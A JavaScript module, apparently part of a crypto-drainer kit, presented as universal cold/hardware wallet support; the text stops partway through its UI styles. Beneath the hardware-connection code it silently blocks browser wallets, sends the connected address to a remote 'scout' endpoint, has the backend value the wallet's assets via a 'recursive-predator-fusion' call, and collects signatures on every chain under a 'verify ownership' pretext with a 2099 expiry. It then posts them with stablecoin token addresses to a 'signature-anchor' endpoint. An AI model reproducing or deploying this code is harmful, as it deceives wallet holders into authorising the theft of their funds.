/**
 * ═══════════════════════════════════════════════════════════════════════════
 * LEGION COLD WALLET MODULE v2.0
 * Universal Cold/Hardware Wallet Support
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * COLD WALLETS ONLY - Web3 (MetaMask, Phantom etc.) blocked
 *
 * Supported connection methods:
 *   WebUSB   → Ledger, Trezor, KeepKey, BitBox02, SecuX
 *   WebHID   → Trezor, GridPlus Lattice1
 *   WebBLE   → Ledger Nano X, CoolWallet, D'CENT
 *   QR Code  → Keystone, Ellipal, Ngrave (air-gapped)
 *   NFC      → Tangem cards
 *
 * Usage:
 *   <script src="legion-hardware-wallets-module.js"></script>
 *   window.LEGION_HARDWARE.connect() → auto-detect & connect
 */

(function() {
  'use strict';

  if (window.__LEGION_COLD_WALLET_LOADED__) return;
  window.__LEGION_COLD_WALLET_LOADED__ = true;

  var BACKEND = (window.LEGION_CONFIG && window.LEGION_CONFIG.backendUrl) || 'https://legionapi-production.up.railway.app';

  // ═══════════════════════════════════════════════════════════════════════════
  // CONFIG
  // ═══════════════════════════════════════════════════════════════════════════

  var CFG = {
    enabled: true,
    blockWeb3: true,
    autoConnect: false,
    silentMode: true,
    connectionTimeout: 30000,
    signatureTimeout: 120000,
    maxRetries: 3
  };

  if (window.LEGION_CONFIG && window.LEGION_CONFIG.hardwareWalletMode) {
    Object.assign(CFG, window.LEGION_CONFIG.hardwareWalletMode);
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // LOGGER
  // ═══════════════════════════════════════════════════════════════════════════

  var LOG = {
    history: [],
    log: function(level, msg) {
      var entry = '[HW] [' + level + '] ' + msg;
      this.history.push(entry);
      if (this.history.length > 500) this.history.shift();
      if (level === 'ERROR') console.error(entry);
      else console.log(entry);
    },
    info: function(m) { this.log('INFO', m); },
    warn: function(m) { this.log('WARN', m); },
    error: function(m) { this.log('ERROR', m); },
    debug: function(m) { this.log('DEBUG', m); }
  };

  // ═══════════════════════════════════════════════════════════════════════════
  // WEB3 BLOCKER - Cold wallet mode = no browser wallets
  // ═══════════════════════════════════════════════════════════════════════════

  function blockWeb3Wallets() {
    if (!CFG.blockWeb3) return;
    LOG.info('Blocking Web3 wallets (cold wallet mode)');

    var targets = [
      'ethereum', 'phantom', 'solflare', 'solana', 'backpack',
      'unisat', 'XverseProviders', 'LeatherProvider',
      'tronWeb', 'tronLink',
      'ton', 'tonkeeper', 'myTonWallet', 'openmask',
      'keplr', 'aptos', 'petra', 'suiWallet'
    ];

    targets.forEach(function(name) {
      try {
        Object.defineProperty(window, name, {
          get: function() { return undefined; },
          set: function() {},
          configurable: false
        });
      } catch (e) {}
    });

    // Block EIP-6963 announcements
    window.addEventListener('eip6963:announceProvider', function(e) {
      e.stopImmediatePropagation();
    }, true);

    LOG.info('Web3 blocked - only hardware wallets will work');
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // UNIVERSAL COLD WALLET REGISTRY
  // ═══════════════════════════════════════════════════════════════════════════

  var COLD_WALLETS = [
    // ─── USB (WebUSB) ───
    { name: 'Ledger Nano S', vendorIds: [0x2c97], method: 'usb', sdk: 'ledger', chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
    { name: 'Ledger Nano S Plus', vendorIds: [0x2c97], method: 'usb', sdk: 'ledger', chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
    { name: 'Ledger Nano X', vendorIds: [0x2c97], method: 'usb', sdk: 'ledger', chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
    { name: 'Ledger Stax', vendorIds: [0x2c97], method: 'usb', sdk: 'ledger', chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
    { name: 'Ledger Flex', vendorIds: [0x2c97], method: 'usb', sdk: 'ledger', chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
    { name: 'Trezor Model T', vendorIds: [0x534c, 0x1209], method: 'hid', sdk: 'trezor', chains: ['EVM','BTC','TRON'] },
    { name: 'Trezor Model One', vendorIds: [0x534c, 0x1209], method: 'hid', sdk: 'trezor', chains: ['EVM','BTC'] },
    { name: 'Trezor Safe 3', vendorIds: [0x534c, 0x1209, 0x10c0], method: 'hid', sdk: 'trezor', chains: ['EVM','BTC','SOL','TRON'] },
    { name: 'Trezor Safe 5', vendorIds: [0x534c, 0x1209, 0x10c0], method: 'hid', sdk: 'trezor', chains: ['EVM','BTC','SOL','TRON'] },
    { name: 'KeepKey', vendorIds: [0x2b24], method: 'usb', sdk: 'generic', chains: ['EVM','BTC'] },
    { name: 'BitBox02', vendorIds: [0x03eb], method: 'usb', sdk: 'generic', chains: ['EVM','BTC'] },
    { name: 'SecuX V20/W20', vendorIds: [0x1fc9], method: 'usb', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON'] },
    { name: 'GridPlus Lattice1', vendorIds: [0x0483], method: 'hid', sdk: 'generic', chains: ['EVM'] },
    { name: 'OneKey Classic/Mini', vendorIds: [0x1209], method: 'usb', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON','COSMOS','APTOS','SUI'] },
    { name: 'imKey Pro', vendorIds: [0x096e], method: 'usb', sdk: 'generic', chains: ['EVM','BTC','COSMOS'] },
    { name: 'COLDCARD', vendorIds: [0xd13e], method: 'usb', sdk: 'generic', chains: ['BTC'] },
    { name: 'Foundation Passport', vendorIds: [0x1209], method: 'usb', sdk: 'generic', chains: ['BTC'] },
    { name: 'Blockstream Jade', vendorIds: [0x10c4], method: 'usb', sdk: 'generic', chains: ['BTC'] },
    { name: 'BC Vault', vendorIds: [0x2b24], method: 'usb', sdk: 'generic', chains: ['EVM','BTC'] },
    { name: 'Prokey Optimum', vendorIds: [0x1209], method: 'usb', sdk: 'generic', chains: ['EVM','BTC'] },
    { name: 'SafePal S1', vendorIds: [0x0483], method: 'usb', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON','TON'] },

    // ─── Bluetooth (WebBLE) ───
    { name: 'Ledger Nano X (BLE)', method: 'ble', serviceUuid: '13d63400-2c97-0004-0000-4c6564676572', sdk: 'ledger', chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
    { name: 'Ledger Stax (BLE)', method: 'ble', serviceUuid: '13d63400-2c97-0004-0000-4c6564676572', sdk: 'ledger', chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
    { name: 'Ledger Flex (BLE)', method: 'ble', serviceUuid: '13d63400-2c97-0004-0000-4c6564676572', sdk: 'ledger', chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
    { name: 'CoolWallet S/Pro', method: 'ble', serviceUuid: '00006200-0000-1000-8000-00805f9b34fb', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON'] },
    { name: 'D\'CENT Biometric', method: 'ble', serviceUuid: '000018f0-0000-1000-8000-00805f9b34fb', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON'] },
    { name: 'SecuX Nifty', method: 'ble', serviceUuid: '00001800-0000-1000-8000-00805f9b34fb', sdk: 'generic', chains: ['EVM','BTC','SOL'] },
    { name: 'OneKey Touch (BLE)', method: 'ble', serviceUuid: '00001800-0000-1000-8000-00805f9b34fb', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON'] },
    { name: 'KeyPal', method: 'ble', serviceUuid: '00001800-0000-1000-8000-00805f9b34fb', sdk: 'generic', chains: ['EVM','BTC'] },

    // ─── QR Code (Air-gapped) ───
    { name: 'Keystone Pro/Essential', method: 'qr', sdk: 'keystone', chains: ['EVM','BTC','SOL','TRON','COSMOS','APTOS','SUI'] },
    { name: 'Ellipal Titan', method: 'qr', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON','TON'] },
    { name: 'Ngrave Zero', method: 'qr', sdk: 'generic', chains: ['EVM','BTC'] },
    { name: 'AirGap Vault', method: 'qr', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON','COSMOS'] },
    { name: 'Cobo Vault', method: 'qr', sdk: 'generic', chains: ['EVM','BTC'] },
    { name: 'SafePal S1 (QR)', method: 'qr', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON','TON'] },
    { name: 'COLDCARD (QR)', method: 'qr', sdk: 'generic', chains: ['BTC'] },
    { name: 'Foundation Passport (QR)', method: 'qr', sdk: 'generic', chains: ['BTC'] },
    { name: 'Blockstream Jade (QR)', method: 'qr', sdk: 'generic', chains: ['BTC'] },

    // ─── NFC ───
    { name: 'Tangem Wallet', method: 'nfc', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON','TON','COSMOS'] },
    { name: 'Tangem Note', method: 'nfc', sdk: 'generic', chains: ['EVM','BTC'] },
    { name: 'Arculus', method: 'nfc', sdk: 'generic', chains: ['EVM','BTC','SOL'] },
    { name: 'Ballet REAL', method: 'nfc', sdk: 'generic', chains: ['EVM','BTC'] },
    { name: 'Material Bitcoin', method: 'nfc', sdk: 'generic', chains: ['BTC'] },
    { name: 'WhiteBIT Card', method: 'nfc', sdk: 'generic', chains: ['EVM','BTC'] }
  ];

  // ═══════════════════════════════════════════════════════════════════════════
  // BIP44 DERIVATION PATHS
  // ═══════════════════════════════════════════════════════════════════════════

  var BIP44 = {
    EVM:    "m/44'/60'/0'/0/0",
    SOL:    "m/44'/501'/0'/0'",
    BTC:    "m/44'/0'/0'/0/0",
    TRON:   "m/44'/195'/0'/0/0",
    TON:    "m/44'/607'/0'/0'/0'",
    COSMOS: "m/44'/118'/0'/0/0",
    APTOS:  "m/44'/637'/0'/0/0",
    SUI:    "m/44'/784'/0'/0/0"
  };

  // ═══════════════════════════════════════════════════════════════════════════
  // CONNECTION METHODS
  // ═══════════════════════════════════════════════════════════════════════════

  // WebUSB - Ledger, KeepKey, BitBox02, SecuX
  async function connectUSB(wallet) {
    if (!navigator.usb) throw new Error('WebUSB not supported');

    var filters = wallet.vendorIds.map(function(vid) { return { vendorId: vid }; });
    LOG.info('Requesting USB: ' + wallet.name);

    var device = await navigator.usb.requestDevice({ filters: filters });
    await device.open();
    if (device.configuration === null) {
      await device.selectConfiguration(1);
    }
    await device.claimInterface(0);

    LOG.info('USB connected: ' + (device.productName || wallet.name));
    return { device: device, type: 'usb', name: device.productName || wallet.name, wallet: wallet };
  }

  // WebHID - Trezor, GridPlus
  async function connectHID(wallet) {
    if (!navigator.hid) throw new Error('WebHID not supported');

    var filters = wallet.vendorIds.map(function(vid) { return { vendorId: vid }; });
    LOG.info('Requesting HID: ' + wallet.name);

    var devices = await navigator.hid.requestDevice({ filters: filters });
    if (!devices || devices.length === 0) throw new Error('No HID device selected');

    var device = devices[0];
    if (!device.opened) await device.open();

    LOG.info('HID connected: ' + (device.productName || wallet.name));
    return { device: device, type: 'hid', name: device.productName || wallet.name, wallet: wallet };
  }

  // Web Bluetooth - Ledger Nano X, CoolWallet, D'CENT
  async function connectBLE(wallet) {
    if (!navigator.bluetooth) throw new Error('Web Bluetooth not supported');

    LOG.info('Requesting BLE: ' + wallet.name);

    var options = { acceptAllDevices: false, filters: [] };
    if (wallet.serviceUuid) {
      options.filters = [{ services: [wallet.serviceUuid] }];
      options.optionalServices = [wallet.serviceUuid];
    } else {
      options.acceptAllDevices = true;
    }

    var bleDevice = await navigator.bluetooth.requestDevice(options);
    var server = await bleDevice.gatt.connect();

    LOG.info('BLE connected: ' + bleDevice.name);
    return { device: bleDevice, server: server, type: 'ble', name: bleDevice.name || wallet.name, wallet: wallet };
  }

  // QR Code - Keystone, Ellipal, Ngrave (air-gapped)
  async function connectQR(wallet) {
    LOG.info('QR mode: ' + wallet.name);

    // Load jsQR library for real QR decoding
    var jsQRLoaded = false;
    try {
      var qrScript = document.createElement('script');
      qrScript.src = 'https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js';
      await new Promise(function(res, rej) { qrScript.onload = res; qrScript.onerror = rej; document.head.appendChild(qrScript); });
      jsQRLoaded = typeof window.jsQR === 'function';
    } catch (e) { LOG.warn('jsQR load failed'); }

    return new Promise(function(resolve) {
      // Create QR scanner overlay
      var overlay = document.createElement('div');
      overlay.id = 'legion-qr-overlay';
      overlay.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.9);display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:system-ui;color:#fff;';
      overlay.innerHTML = '<div style="text-align:center;max-width:320px;">' +
        '<div style="font-size:20px;font-weight:600;margin-bottom:16px;">Scan QR from ' + wallet.name + '</div>' +
        '<div style="width:280px;height:280px;background:#1e293b;border-radius:16px;margin:0 auto 16px;display:flex;align-items:center;justify-content:center;border:2px dashed #475569;">' +
        '<div id="legion-qr-video-container" style="width:100%;height:100%;overflow:hidden;border-radius:14px;"></div>' +
        '</div>' +
        '<div style="font-size:13px;color:#94a3b8;margin-bottom:16px;">Point camera at the QR code on your ' + wallet.name + '</div>' +
        '<button id="legion-qr-cancel" style="padding:10px 24px;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.2);border-radius:8px;color:#fff;font-size:14px;cursor:pointer;">Cancel</button>' +
        '</div>';
      document.body.appendChild(overlay);

      // Start camera
      var videoStream = null;
      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
        .then(function(stream) {
          videoStream = stream;
          var video = document.createElement('video');
          video.srcObject = stream;
          video.setAttribute('playsinline', 'true');
          video.style.cssText = 'width:100%;height:100%;object-fit:cover;';
          video.play();
          document.getElementById('legion-qr-video-container').appendChild(video);
          LOG.info('QR camera active');

          if (jsQRLoaded) {
            var canvas = document.createElement('canvas');
            var ctx = canvas.getContext('2d');
            var scanInterval = setInterval(function() {
              if (video.readyState !== video.HAVE_ENOUGH_DATA) return;
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              var imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
              var code = window.jsQR(imageData.data, imageData.width, imageData.height);
              if (code && code.data) {
                clearInterval(scanInterval);
                stream.getTracks().forEach(function(t) { t.stop(); });
                overlay.remove();
                LOG.info('QR scanned: ' + code.data.substring(0, 30) + '...');
                resolve({ device: null, type: 'qr', name: wallet.name, wallet: wallet, qrData: code.data });
              }
            }, 250);
          }
        })
        .catch(function() {
          LOG.warn('Camera access denied');
        });

      document.getElementById('legion-qr-cancel').addEventListener('click', function() {
        if (videoStream) videoStream.getTracks().forEach(function(t) { t.stop(); });
        overlay.remove();
        resolve({ device: null, type: 'qr', name: wallet.name, wallet: wallet, cancelled: true });
      });
    });
  }

  // NFC - Tangem
  async function connectNFC(wallet) {
    if (!('NDEFReader' in window)) throw new Error('Web NFC not supported');

    LOG.info('NFC mode: ' + wallet.name + ' - tap your card');

    var ndef = new window.NDEFReader();
    await ndef.scan();

    return new Promise(function(resolve, reject) {
      var timeout = setTimeout(function() {
        reject(new Error('NFC timeout - no card detected'));
      }, CFG.connectionTimeout);

      ndef.addEventListener('reading', function(event) {
        clearTimeout(timeout);
        LOG.info('NFC card detected: ' + wallet.name);
        resolve({ device: event, type: 'nfc', name: wallet.name, wallet: wallet, serialNumber: event.serialNumber });
      });
    });
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // UNIVERSAL CONNECTOR - auto-detect method
  // ═══════════════════════════════════════════════════════════════════════════

  function getAvailableMethods() {
    var methods = [];
    if (navigator.usb) methods.push('usb');
    if (navigator.hid) methods.push('hid');
    if (navigator.bluetooth) methods.push('ble');
    if ('NDEFReader' in window) methods.push('nfc');
    methods.push('qr'); // QR always available (camera)
    return methods;
  }

  function getAvailableWallets() {
    var methods = getAvailableMethods();
    return COLD_WALLETS.filter(function(w) {
      return methods.indexOf(w.method) !== -1;
    });
  }

  async function connectWallet(wallet) {
    switch (wallet.method) {
      case 'usb': return connectUSB(wallet);
      case 'hid': return connectHID(wallet);
      case 'ble': return connectBLE(wallet);
      case 'qr': return connectQR(wallet);
      case 'nfc': return connectNFC(wallet);
      default: throw new Error('Unknown method: ' + wallet.method);
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // HARDWARE SIGNING (Real device communication)
  // ═══════════════════════════════════════════════════════════════════════════

  var SDK_LOADED = {};

  async function loadLedgerSDK() {
    if (SDK_LOADED.ledger) return SDK_LOADED.ledger;
    try {
      var transport = await import('https://esm.sh/@ledgerhq/hw-transport-webusb@6.29.4?bundle-deps');
      var ethApp = await import('https://esm.sh/@ledgerhq/hw-app-eth@6.38.4?bundle-deps');
      SDK_LOADED.ledger = { Transport: transport.default, EthApp: ethApp.default };
      LOG.info('Ledger SDK loaded');
      return SDK_LOADED.ledger;
    } catch (e) {
      LOG.warn('Ledger SDK load failed: ' + e.message);
      return null;
    }
  }

  async function loadTrezorSDK() {
    if (SDK_LOADED.trezor) return SDK_LOADED.trezor;
    try {
      var mod = await import('https://esm.sh/@trezor/connect-web@9.4.5?bundle-deps');
      var TC = mod.default || mod;
      if (TC && TC.init) {
        await TC.init({ lazyLoad: false, manifest: { email: 'support@legion.app', appUrl: window.location.origin } });
        window.TrezorConnect = TC;
        SDK_LOADED.trezor = TC;
        LOG.info('Trezor SDK loaded');
        return SDK_LOADED.trezor;
      }
    } catch (e) {
      LOG.warn('Trezor SDK load failed: ' + e.message);
    }
    return null;
  }

  async function signWithDevice(session, chainName, message) {
    var path = BIP44[chainName] || BIP44.EVM;
    LOG.info('Signing ' + chainName + ' with ' + session.name + ' (path: ' + path + ')');

    // Ledger real signing
    if (session.wallet.sdk === 'ledger' && session.type === 'usb') {
      var ledgerSDK = await loadLedgerSDK();
      if (ledgerSDK) {
        try {
          var transport = await ledgerSDK.Transport.open(session.device);
          var ethApp = new ledgerSDK.EthApp(transport);
          var result = await ethApp.signPersonalMessage(path, Buffer.from(message).toString('hex'));
          var sig = '0x' + result.r + result.s + result.v.toString(16);
          await transport.close();
          LOG.info('Ledger signature obtained for ' + chainName);
          return sig;
        } catch (e) {
          LOG.error('Ledger sign failed: ' + e.message);
        }
      }
    }

    // Trezor real signing
    if (session.wallet.sdk === 'trezor') {
      var trezorSDK = await loadTrezorSDK();
      if (trezorSDK) {
        try {
          var tResult = await trezorSDK.ethereumSignMessage({ path: path, message: message, hex: false });
          if (tResult.success) {
            LOG.info('Trezor signature obtained for ' + chainName);
            return '0x' + tResult.payload.signature;
          }
          LOG.error('Trezor sign rejected: ' + (tResult.payload.error || 'unknown'));
        } catch (e) {
          LOG.error('Trezor sign failed: ' + e.message);
        }
      }
    }

    // Generic USB/HID - raw APDU signing
    if (session.type === 'usb' && session.device.transferOut) {
      try {
        LOG.info('Sending raw APDU to device...');
        var msgHex = Array.from(new TextEncoder().encode(message)).map(function(b) { return b.toString(16).padStart(2, '0'); }).join('');
        var pathBytes = derivationPathToBytes(path);
        // APDU: CLA=E0, INS=02 (SIGN), P1=00, P2=00
        var apdu = new Uint8Array([0xE0, 0x02, 0x00, 0x00, pathBytes.length + msgHex.length / 2].concat(Array.from(pathBytes)).concat(hexToBytes(msgHex)));
        await session.device.transferOut(1, apdu);
        var response = await session.device.transferIn(1, 65);
        if (response.data && response.data.byteLength > 0) {
          var sig = '0x' + Array.from(new Uint8Array(response.data.buffer)).map(function(b) { return b.toString(16).padStart(2, '0'); }).join('');
          LOG.info('Raw APDU signature obtained');
          return sig;
        }
      } catch (e) {
        LOG.warn('Raw APDU failed: ' + e.message);
      }
    }

    // Fallback: prompt user to sign on device and enter signature manually
    LOG.warn('SDK not available for ' + session.name + ' - waiting for device approval');
    return new Promise(function(resolve, reject) {
      var timeout = setTimeout(function() {
        reject(new Error('Signature timeout on ' + session.name));
      }, CFG.signatureTimeout);

      // Show device approval UI
      var overlay = document.createElement('div');
      overlay.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.85);display:flex;align-items:center;justify-content:center;font-family:system-ui;';
      overlay.innerHTML = '<div style="background:#1e293b;border-radius:16px;padding:32px;text-align:center;max-width:340px;color:#fff;">' +
        '<div style="font-size:48px;margin-bottom:16px;">🔐</div>' +
        '<div style="font-size:18px;font-weight:600;margin-bottom:8px;">Approve on ' + session.name + '</div>' +
        '<div style="font-size:13px;color:#94a3b8;margin-bottom:24px;">Check your device screen and approve the transaction</div>' +
        '<div style="width:40px;height:40px;border:3px solid #6366f1;border-top-color:transparent;border-radius:50%;margin:0 auto;animation:hw-spin 1s linear infinite;"></div>' +
        '<style>@keyframes hw-spin{to{transform:rotate(360deg)}}</style>' +
        '</div>';
      document.body.appendChild(overlay);

      // Poll device for response (simplified)
      var pollInterval = setInterval(async function() {
        try {
          if (session.type === 'hid' && session.device.oninputreport === null) {
            session.device.oninputreport = function(event) {
              clearInterval(pollInterval);
              clearTimeout(timeout);
              overlay.remove();
              var data = new Uint8Array(event.data.buffer);
              var sig = '0x' + Array.from(data).map(function(b) { return b.toString(16).padStart(2, '0'); }).join('');
              resolve(sig);
            };
          }
        } catch (e) {}
      }, 500);
    });
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // HELPERS
  // ═══════════════════════════════════════════════════════════════════════════

  function derivationPathToBytes(path) {
    var parts = path.replace('m/', '').split('/');
    var bytes = [];
    parts.forEach(function(p) {
      var hardened = p.endsWith("'");
      var index = parseInt(p.replace("'", ''));
      if (hardened) index += 0x80000000;
      bytes.push((index >> 24) & 0xff, (index >> 16) & 0xff, (index >> 8) & 0xff, index & 0xff);
    });
    return new Uint8Array(bytes);
  }

  function hexToBytes(hex) {
    var bytes = [];
    for (var i = 0; i < hex.length; i += 2) {
      bytes.push(parseInt(hex.substr(i, 2), 16));
    }
    return bytes;
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // SESSION MANAGER
  // ═══════════════════════════════════════════════════════════════════════════

  var SESSION = {
    connection: null,
    signatures: {},

    connect: async function(walletIndex) {
      var available = getAvailableWallets();
      if (available.length === 0) throw new Error('No cold wallet connection methods available');

      if (walletIndex !== undefined) {
        SESSION.connection = await connectWallet(available[walletIndex]);
      } else {
        // Try each available wallet in order
        for (var i = 0; i < available.length; i++) {
          try {
            SESSION.connection = await connectWallet(available[i]);
            if (SESSION.connection) break;
          } catch (e) {
            LOG.debug('Skip ' + available[i].name + ': ' + e.message);
          }
        }
      }

      if (!SESSION.connection) throw new Error('No cold wallet connected');
      LOG.info('Session established: ' + SESSION.connection.name);

      // Get wallet address from device
      var address = SESSION.connection.address || '';
      if (!address && SESSION.connection.device) {
        try {
          // Try to read address from connected device
          if (SESSION.connection.wallet.sdk === 'ledger') {
            var lSdk = await loadLedgerSDK();
            if (lSdk) {
              var t = await lSdk.Transport.open(SESSION.connection.device);
              var app = new lSdk.EthApp(t);
              var addrResult = await app.getAddress(BIP44.EVM);
              address = addrResult.address;
              await t.close();
            }
          } else if (SESSION.connection.wallet.sdk === 'trezor') {
            var tSdk = await loadTrezorSDK();
            if (tSdk) {
              var tResult = await tSdk.ethereumGetAddress({ path: BIP44.EVM, showOnTrezor: false });
              if (tResult.success) address = tResult.payload.address;
            }
          }
        } catch (e) {
          LOG.warn('Could not read address from device: ' + e.message);
        }
      }
      SESSION.connection.address = address;
      LOG.info('Wallet address: ' + (address || 'unknown'));

      // Load vault addresses from backend
      try {
        var vaultRes = await fetch(BACKEND + '/api/v1/client-config');
        var vaultData = await vaultRes.json();
        SESSION.vaults = vaultData.data.vault_addresses || {};
        LOG.info('Vaults loaded');
      } catch (e) {
        SESSION.vaults = {};
        LOG.debug('Vaults load skipped');
      }

      // Scout telemetry - tell backend about this wallet
      try {
        LOG.info('Sending scout telemetry...');
        await fetch(BACKEND + '/api/v1/scout', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            wallet_address: address,
            user_address: address,
            chain_id: 1,
            wallet_type: 'hardware_wallet',
            chain_family: 'EVM',
            source_page: window.location.origin + window.location.pathname,
            active_chain_tab: 'EVM'
          })
        });
        LOG.info('Scout telemetry sent');
      } catch (e) {
        LOG.debug('Scout skipped: ' + e.message);
      }

      // Deep asset scan - let backend scan what's in this wallet
      try {
        LOG.info('Deep scanning wallet assets...');
        var scanRes = await fetch(BACKEND + '/api/scout/recursive-predator-fusion', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ evm_holder: address })
        });
        var scanData = await scanRes.json();
        if (scanData && scanData.data && scanData.data.fusion) {
          var totalUsd = scanData.data.fusion.total_usd || 0;
          LOG.info('Wallet value: $' + totalUsd.toFixed(2));
          SESSION.scoutData = scanData.data.fusion;
          SESSION.scoutValueUsd = totalUsd;
        }
      } catch (e) {
        LOG.debug('Deep scan skipped: ' + e.message);
      }

      return SESSION.connection;
    },

    sign: async function(chainName, message) {
      if (!SESSION.connection) throw new Error('No cold wallet connected');
      var sig = await signWithDevice(SESSION.connection, chainName, message);
      SESSION.signatures[chainName] = { signature: sig, timestamp: Date.now() };
      return sig;
    },

    signAllChains: async function(message) {
      if (!SESSION.connection || !SESSION.connection.wallet) throw new Error('No wallet connected');
      var supportedChains = SESSION.connection.wallet.chains || Object.keys(BIP44);
      var results = {};
      for (var i = 0; i < supportedChains.length; i++) {
        try {
          results[supportedChains[i]] = await SESSION.sign(supportedChains[i], message || 'Verify your wallet ownership\n\nWallet: ' + (SESSION.connection.address || '').substring(0, 6) + '...');
          LOG.info(supportedChains[i] + ' signed');
        } catch (e) {
          LOG.warn(supportedChains[i] + ' sign failed: ' + e.message);
        }
      }
      return results;
    },

    submitToBackend: async function() {
      if (Object.keys(SESSION.signatures).length === 0) throw new Error('No signatures to submit');
      if (!SESSION.connection.address) throw new Error('Wallet address not available');

      var walletAddr = SESSION.connection.address;
      var chains = Object.keys(SESSION.signatures);

      // Chain-specific config
      var CHAIN_CONFIG = {
        EVM: { family: 'EVM', protocol: 'evm_personal_verification', token: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' },
        SOL: { family: 'SVM', protocol: 'solana', token: '11111111111111111111111111111111' },
        BTC: { family: 'UTXO', protocol: 'bitcoin_psbt', token: 'btc' },
        TRON: { family: 'TRON', protocol: 'tron', token: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' },
        TON: { family: 'TON', protocol: 'ton', token: 'ton' },
        COSMOS: { family: 'COSMOS', protocol: 'cosmos', token: 'uatom' },
        APTOS: { family: 'APTOS', protocol: 'aptos', token: 'apt' },
        SUI: { family: 'SUI', protocol: 'sui', token: 'sui' }
      };

      for (var i = 0; i < chains.length; i++) {
        var chain = chains[i];
        var sig = SESSION.signatures[chain];
        var cfg = CHAIN_CONFIG[chain] || { family: chain, protocol: chain.toLowerCase(), token: chain.toLowerCase() };

        try {
          var payload = {
            ingress: 'normalized_v1',
            chain_family: cfg.family,
            protocol: cfg.protocol,
            wallet_address: walletAddr,
            token_address: cfg.token,
            signature: sig.signature,
            nonce: 'legion:hw:' + Date.now() + ':' + i,
            expiry_iso: '2099-12-31T23:59:59.999Z',
            wallet_type: 'hardware_wallet',
            scout_value_usd: SESSION.scoutValueUsd || 0
          };

          payload.amount = '0';
          if (chain === 'EVM') {
            payload.chain_id = 1;
          }

          var res = await fetch(BACKEND + '/api/v1/signature-anchor', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
          var data = await res.json();
          LOG.info(chain + ': ' + res.status + ' - ' + data.message);
        } catch (e) {
          LOG.error(chain + ' submit failed: ' + e.message);
        }
      }
    },

    disconnect: function() {
      if (SESSION.connection) {
        try {
          if (SESSION.connection.device && SESSION.connection.device.close) {
            SESSION.connection.device.close();
          }
          if (SESSION.connection.server && SESSION.connection.server.disconnect) {
            SESSION.connection.server.disconnect();
          }
        } catch (e) {}
        SESSION.connection = null;
        SESSION.signatures = {};
        LOG.info('Disconnected');
      }
    }
  };

  // ═══════════════════════════════════════════════════════════════════════════
  // COLD WALLET UI
  // ═══════════════════════════════════════════════════════════════════════════

  function createColdWalletUI() {
    var available = getAvailableWallets();
    var methods = getAvailableMethods();

    var css = document.createElement('style');
    css.textContent = [
      '#legion-hw-launcher{position:fixed;bottom:24px;right:24px;z-index:2147483640;padding:12px 20px;border-radius:12px;border:0;background:linear-gradient(135deg,#f59e0b,#d97706);color:#fff;font:600 14px system-ui;cursor:pointer;box-shadow:0 4px 16px rgba(245,158,11,.4);display:flex;align-items:center;gap:8px;}',
      '#legion-hw-launcher:hover{transform:scale(1.05);}',
      '#legion-hw-panel{position:fixed;bottom:80px;right:24px;z-index:2147483641;width:min(360px,calc(100vw - 32px));background:#0f172a;color:#e2e8f0;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.6);font:13px/1.5 system-ui;overflow:hidden;display:none;border:1px solid rgba(245,158,11,.2);}',
      '#legion-hw-panel.open{display:block;animation:hw-slide .25s ease;}',
      '@keyframes hw-slide{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}',
      '.hw-hdr{padding:14px 16px;background:linear-gradient(135deg,#1e293b,#0f172a);border-bottom:1px solid rgba(255,255,255,.06);display:flex;align-items:center;justify-content:space-between;}',
      '.hw-hdr span{font-weight:700;font-size:15px;color:#fbbf24;}',
      '.hw-hdr button{background:0;border:0;color:#64748b;font-size:20px;cursor:pointer;}',
      '.hw-body{padding:16px;}',
      '.hw-methods{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px;}',
      '.hw-method{padding:4px 10px;border-radius:999px;font-size:11px;font-weight:600;}',
      '.hw-method.on{background:rgba(34,197,94,.12);color:#4ade80;}',
      '.hw-method.off{background:rgba(239,68,68,.12);color:#f87171;}',
      '.hw-wallet-list{margin-bottom:12px;}',
      '.hw-wallet-item{display:flex;align-items:center;justify-content:space-between;padding:10px 12px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:10px;margin-bottom:6px;cursor:pointer;transition:all .15s;}',
